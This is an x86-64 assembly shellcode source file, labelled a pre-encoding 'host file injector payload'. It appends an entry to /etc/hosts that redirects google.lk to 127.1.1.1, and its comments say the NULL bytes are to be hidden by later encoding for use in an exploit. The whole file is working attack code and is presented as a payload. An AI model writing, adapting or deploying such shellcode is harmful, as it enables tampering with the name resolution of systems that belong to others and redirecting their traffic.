; Pre encode verison of host file injector payload
; Contains NULL bytes which will be masked by encoding

global _start
section .TEXT exec write

_start:

; open
    xor rsi, rsi
    add si, 0x401       ; read/write and append flags
    call _jump1
    db '/etc/hosts', 0x00
_jump1:
    pop rdi             ; path reference
    push 2
    pop rax       
    syscall

; write
    xchg rax, rdi
    push 1
    pop rax             ; syscall for write
    call _jump2
    db '127.1.1.1 google.lk', 0xa
_jump2:
    pop rsi 
    push 20             ; length in rdx
    pop rdx 
    syscall

;close
    push 3
    pop rax
    syscall

;exit
    push 60
    pop rax
    syscall 
